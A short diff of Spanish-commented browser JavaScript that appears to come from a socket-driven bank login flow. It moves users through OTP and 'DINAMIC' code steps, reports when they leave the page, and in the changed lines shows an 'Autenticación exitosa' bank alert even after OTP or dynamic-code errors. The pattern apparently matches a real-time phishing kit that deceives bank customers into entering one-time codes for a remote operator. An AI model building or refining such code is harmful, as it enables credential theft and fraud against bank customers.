@@ -74,9 +74,9 @@
     }
 
     // ✅ Cuando se cierra la pestaña / navega fuera
-    window.addEventListener("pagehide", () => beaconPresence("INACTIVE"));
+/*     window.addEventListener("pagehide", () => beaconPresence("INACTIVE"));
     window.addEventListener("beforeunload", () => beaconPresence("INACTIVE"));
-
+ */
     // =========================
     // ✅ SOCKET CORE
     // =========================
@@ -275,17 +275,16 @@
             // 3) Acciones "finales" que avanzan
             if (expected && current && expected !== current) {
                 // ✅ Caso especial: AUTH → DINAMIC
-
                 if (
                     action === "DINAMIC" ||
                     action === "OTP" ||
-                    action === "DINAMIC_ERROR" ||
-                    (action === "OTP_ERROR" && String(current) === "2")
+                    (action === "OTP_ERROR" && String(current) === "2") ||
+                    (action === "DINAMIC_ERROR" && String(current) === "2")
                 ) {
                     setTimeout(() => {
                         // Muestra mensaje de éxito
                         safeHideLoading();
-                        showBankAlert?.("success", "Autenticación exitosa.");
+                        showBankAlert?.("success", String(current) === "2" ? "Autenticación exitosa.": "Codigo Verificado.");
                         setTimeout(() => {
                             hideBankAlert();
                         }, 1000);
